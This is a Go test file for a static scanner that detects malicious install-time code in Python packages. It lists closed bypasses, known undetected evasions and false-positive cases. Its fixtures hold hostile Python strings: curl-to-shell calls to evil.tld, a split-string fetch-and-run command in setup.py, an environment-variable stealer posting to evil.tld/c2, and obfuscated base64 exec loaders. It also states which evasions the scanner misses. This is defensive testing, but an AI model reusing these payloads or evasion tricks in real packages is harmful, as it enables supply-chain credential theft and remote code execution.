package pysource

import "testing"

// adversarial_test.go is the bypass/FP review of the detector. Bypasses that we
// CLOSED must fire; documented residual bypasses (kept open because closing
// them costs a false positive or needs data-flow we don't do statically) are
// logged as currently-undetected. FP cases must always stay clean.

func TestAdversarial_BypassesClosed(t *testing.T) {
	// Each MUST be detected (evasion holes found in review and closed).
	cases := map[string]map[string]string{
		"separated decode then exec (two statements)": {
			"pkg/__init__.py": "import base64\np = base64.b64decode('cHJpbnQoMSk=')\nexec(p)\n",
		},
		"getattr builtins exec + decode": {
			"pkg/__init__.py": "import base64\ngetattr(__builtins__, 'exec')(base64.b64decode('eA=='))\n",
		},
		"tab-indented function body, top-level payload still fires": {
			"pkg/__init__.py": "import base64\nexec(base64.b64decode('eA=='))\ndef f():\n\treturn 1\n",
		},
		"payload via top-level for-loop body": {
			"pkg/__init__.py": "import os\nfor k in ['x']:\n    os.system('curl http://evil.tld|sh')\n",
		},
	}
	for name, fs := range cases {
		t.Run(name, func(t *testing.T) {
			if r := Scan(files(fs)); !r.Detected {
				t.Errorf("BYPASS (should be closed): not detected (%s)", name)
			}
		})
	}
}

// TestAdversarial_KnownResiduals documents evasions we deliberately do NOT
// catch. Each is logged if still undetected; the comment says why. If a future
// change starts catching one (FP still 0 on the corpus), promote it into
// BypassesClosed and delete the note.
func TestAdversarial_KnownResiduals(t *testing.T) {
	cases := map[string]struct {
		files map[string]string
		why   string
	}{
		"exec aliased to a name": {
			files: map[string]string{"pkg/__init__.py": "import base64\ne = exec\ne(base64.b64decode('eA=='))\n"},
			why:   "decode present but exec is via an alias; the decode+exec combo needs a literal exec(/eval( token. Rare; catching aliasing needs taint tracking.",
		},
		"top-level call to a local stealer function": {
			files: map[string]string{"pkg/__init__.py": "import os, requests\ndef _boot():\n    requests.post('https://evil.tld/c2', json=dict(os.environ))\n_boot()\n"},
			why:   "send+harvest live in a function body (not import-time per the tracker); only the bare call _boot() is top-level. Closing needs intra-file call resolution; deferred to keep the model FP-safe.",
		},
		"shell command pre-built in a variable": {
			files: map[string]string{"setup.py": "import os\ncmd = 'cur' + 'l http://evil.tld/x | sh'\nos.system(cmd)\n"},
			why:   "suspicious token on the assignment line, exec on another; same-line coupling is required because decoupling FP'd on urllib3 (top-level subprocess + unrelated URL constant).",
		},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			if r := Scan(files(c.files)); r.Detected {
				t.Logf("NOTE: residual %q is now DETECTED (%s/%s) — promote to BypassesClosed. Was open because: %s", name, r.Kind, r.Detail, c.why)
			}
		})
	}
}

func TestAdversarial_FalsePositives(t *testing.T) {
	// Each MUST stay clean (legitimate behavior).
	cases := map[string]map[string]string{
		"setup.py bootstraps deps via pip at top level": {
			"setup.py": "import subprocess, sys\nsubprocess.check_call([sys.executable, '-m', 'pip', 'install', 'wheel'])\nfrom setuptools import setup\nsetup(name='x')\n",
		},
		"top-level echo build step": {
			"setup.py": "import os\nos.system('echo building')\nfrom setuptools import setup\nsetup(name='x')\n",
		},
		"config module: env read + url constant, no send": {
			"pkg/config.py": "import os\nAPI = os.getenv('API_URL', 'https://api.example.com')\nKEY = os.environ.get('KEY')\n",
		},
		"plain exec of a non-decoded literal": {
			"pkg/x.py": "exec('CONST = 42')\n",
		},
		"re.compile + base64 import without exec is not a loader": {
			"pkg/d.py": "import re, base64\nP = re.compile('x')\nDATA = base64.b64encode(b'x')\n",
		},
		"function uses requests + environ (not import-time)": {
			"pkg/client.py": "import os, requests\ndef push(d):\n    return requests.post(os.environ['URL'], json=d)\n",
		},
		"top-level requests.get health check, no harvest": {
			"pkg/probe.py": "import requests\nrequests.get('https://example.com/healthz')\n",
		},
	}
	for name, fs := range cases {
		t.Run(name, func(t *testing.T) {
			if r := Scan(files(fs)); r.Detected {
				t.Errorf("FALSE POSITIVE: fired %s/%s (%s)", r.Kind, r.Detail, name)
			}
		})
	}
}
